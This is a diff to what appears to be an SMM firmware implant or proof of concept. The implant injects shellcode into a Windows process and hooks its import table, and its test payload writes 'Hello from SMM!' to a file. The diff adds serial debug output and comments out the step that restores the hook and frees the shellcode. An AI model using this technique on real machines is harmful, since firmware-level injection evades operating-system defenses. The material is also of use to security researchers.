@@ -177,7 +177,10 @@ static BOOLEAN WindowsUmdIATHookStage2()
   // hardcoded name to make it ez
   p_memCpy((UINT64)ctx.ParamString1, (UINT64) "c:\\smm.txt", strlen("c:\\smm.txt") + 1, FALSE);
   p_memCpy((UINT64)ctx.ParamString2, (UINT64) "Hello from SMM!", strlen("Hello from SMM!") + 1, FALSE);
-
+  SerialPrintString("CreateFileA = ");
+  SerialPrintNumber(ctx.fn.CreateFileA);
+  SerialPrintString("\r\n");
+  
   //------------------------------------------------
   // 4: TODO: Inject & hook IAT
   //------------------------------------------------
@@ -207,13 +210,17 @@ static BOOLEAN WindowsUmdIATHookStage3()
     SerialPrintStringDebug("  UMD: FAILED! Error or Timeout after 15s.\r\n");
     ret = FALSE;
   }
-  else
-    SerialPrintStringDebug("  UMD: Execution succeeded! Restoring ...\r\n");
+  else {
+    SerialPrintString("Status is ");	  
+    SerialPrintNumber(ctx.Status, 16);	  
+    SerialPrintStringDebug("\r\n  UMD: Execution succeeded! Restoring ...\r\n");
+  }
 
   //------------------------------------------------
   // 6: Restore
   //------------------------------------------------
 
+  /*
   // Restore the IAT hook
   v_memWrite(oThunkInfoIAT.vaThunk, (UINT64)&oThunkInfoIAT.vaFunction, 8, TargetProcess.dirBase, FALSE);
 
@@ -237,6 +244,7 @@ static BOOLEAN WindowsUmdIATHookStage3()
     ShellCode[i] = 0;
   }
   free(ShellCode);
+  */
 
   return ret;
 }
